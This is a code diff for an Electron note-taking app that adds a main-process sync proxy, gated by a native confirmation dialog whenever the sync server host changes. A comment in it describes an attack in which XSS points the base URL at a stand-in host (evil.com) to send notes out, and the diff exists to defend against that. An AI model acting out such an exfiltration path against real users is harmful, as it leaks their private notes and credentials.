@@ -36,6 +36,7 @@ const { DEEPLINK_CHANNEL, PROTOCOL, deeplinkMessage, findDeeplinkInArgv, parseOp
 // 远程配图在界面里加载不了；扩展侧 host_permissions 又只有 127.0.0.1 的十条。
 // 主进程没有这两道限制 —— 「图片一起保存」真正落地就靠这一层。纯函数，可单测。
 const { downloadImages: downloadImagesInMain } = require('./fetch-images.cjs')
+const { createSyncProxy } = require('./sync.cjs')
 
 /** 图片下载通道（preload 用同一个常量；verify-contract 的 C-12a 靠常量名配对两侧）。 */
 const NET_DOWNLOAD_IMAGES_CHANNEL = 'opennote:net:downloadImages'
@@ -1201,6 +1202,120 @@ async function clearSyncAccountKey() {
  * 通道注册。与 `registerAppHandlers` 用同一个 `handle()` 包装
  * （统一的错误降级 + 来源校验）。
  */
+/* ============================================================================
+   同步代理的 IPC（`docs/执行-三端同步-密钥即身份-2026-10-13.md` §5.5）
+
+   ## ★ 为什么「设置 base URL」这个动作本身是一道**信任边界**
+
+   `electron/sync.cjs` 把「每次请求的 URL」钉死在配置好的 base 上 —— 那是为了防止
+   一次 XSS 借主进程把笔记外发。
+
+   但**如果渲染层能随手把 base 改成 `https://evil.com`**，那道防线就没了：
+   攻击者只要先 `configure('https://evil.com')`，再照常 `request('/v1/file', …)`，
+   笔记就发出去了。**「每次请求都相对 base」与「base 可以随便改」合起来等于通用 fetch。**
+
+   所以这个通道**不是**普通的设置项：改 base（或换主机）时**必须有一次用户看得见的确认**
+   （原生对话框，不是网页里的按钮 —— 网页里的按钮 XSS 点得到）。
+   同一个 base 重复设置不弹框（否则每次同步都要点一下）。
+   ============================================================================ */
+
+/** 当前配置的同步服务地址（null = 还没配过）。 */
+let syncProxyBaseUrl = null
+/** 主进程持有的令牌（渲染层派生后一次性交给它，之后逐请求由主进程贴）。 */
+let syncAuthToken = ''
+/** 当前绑定的代理实例（base 变了就重建）。 */
+let syncProxyInstance = null
+
+/**
+ * 确认并设置 base URL。
+ *
+ * 换主机（或第一次设置）时弹**原生**确认框；用户拒绝就保持原状。
+ * `confirm` 可注入，便于测试与自动化。
+ */
+async function configureSyncProxy(baseUrl, confirmImpl) {
+  const candidate = createSyncProxy({ baseUrl, transport: async () => ({ status: 0, headers: {}, body: new Uint8Array() }) })
+  // 同一个 base 重复设置：直接沿用，不打扰用户。
+  if (syncProxyBaseUrl === candidate.baseUrl && syncProxyInstance) {
+    return { baseUrl: candidate.baseUrl, changed: false }
+  }
+
+  const confirm = confirmImpl || defaultSyncProxyConfirm
+  const approved = await confirm(candidate.baseUrl)
+  if (!approved) {
+    const error = new Error('用户取消了同步服务地址的更改')
+    error.code = 'sync-proxy-not-confirmed'
+    throw error
+  }
+
+  syncProxyBaseUrl = candidate.baseUrl
+  syncProxyInstance = createSyncProxy({
+    baseUrl: candidate.baseUrl,
+    // ★ `authToken` 由**主进程**提供：渲染层不再逐请求传它（§5.5）。
+    // ⚠️ 但它是渲染层派生好之后**一次性**交给主进程的（见 `setSyncAuthToken`）——
+    //    主进程这边没有 `@noble`（`server/` 与主进程都不引它，边界规则 B3）。
+    //    所以这比 §5.5 设想的「密钥全程不出主进程」**弱一档**：
+    //    渲染层仍然见过 `authToken` 一次。如实记在这里，不假装已经做到。
+    authToken: () => syncAuthToken,
+    transport: async ({ method, url, headers, body, timeoutMs }) => {
+      const response = await fetch(url, {
+        method,
+        headers,
+        body,
+        signal: AbortSignal.timeout(timeoutMs),
+      })
+      const bytes = new Uint8Array(await response.arrayBuffer())
+      return { status: response.status, headers: Object.fromEntries(response.headers.entries()), body: bytes }
+    },
+  })
+  return { baseUrl: syncProxyBaseUrl, changed: true }
+}
+
+/** 默认的原生确认框。 */
+async function defaultSyncProxyConfirm(baseUrl) {
+  let host = baseUrl
+  try {
+    host = new URL(baseUrl).host
+  } catch {
+    /* 保留原串 */
+  }
+  const window = mainWindow && !mainWindow.isDestroyed() ? mainWindow : null
+  const result = await dialog.showMessageBox(window, {
+    type: 'warning',
+    buttons: ['取消', '允许'],
+    defaultId: 0,
+    cancelId: 0,
+    title: '同步服务地址',
+    message: `要把笔记本同步到这个地址吗？
+
+${host}`,
+    detail: '笔记（以及你的账号凭证）会发送到这个地址。只有你自己搭建的服务才应该继续。',
+  })
+  return result.response === 1
+}
+
+function registerSyncProxyHandlers() {
+  // 渲染层把派生好的令牌交给主进程（之后逐请求不再传）。
+  handle('opennote:sync:setAuthToken', async (token) => {
+    syncAuthToken = typeof token === 'string' ? token : ''
+    return true
+  }, '设置同步令牌失败')
+  handle('opennote:sync:configureProxy', async (baseUrl) => configureSyncProxy(baseUrl), '设置同步服务地址失败')
+  handle(
+    'opennote:sync:proxyRequest',
+    async (input) => {
+      if (!syncProxyInstance) {
+        const error = new Error('同步服务地址还没配置')
+        error.code = 'sync-proxy-unconfigured'
+        throw error
+      }
+      const result = await syncProxyInstance.request(input)
+      // IPC 只能传结构化克隆得了的东西 —— `Uint8Array` 可以，但统一成普通数组更好调试。
+      return { status: result.status, headers: result.headers, body: Array.from(result.body) }
+    },
+    '同步请求失败',
+  )
+}
+
 function registerSyncKeyHandlers() {
   handle('opennote:sync:loadAccountKey', async () => readSyncAccountKey(), '读取同步密钥失败')
   handle('opennote:sync:saveAccountKey', async (text) => { await writeSyncAccountKey(text); return true }, '保存同步密钥失败')
@@ -1315,6 +1430,7 @@ function registerIpcHandlers() {
   registerShellHandlers()
   registerAppHandlers()
   registerSyncKeyHandlers()
+  registerSyncProxyHandlers()
   registerImportHandlers()
   registerNetHandlers()
   registerUpdateHandlers()
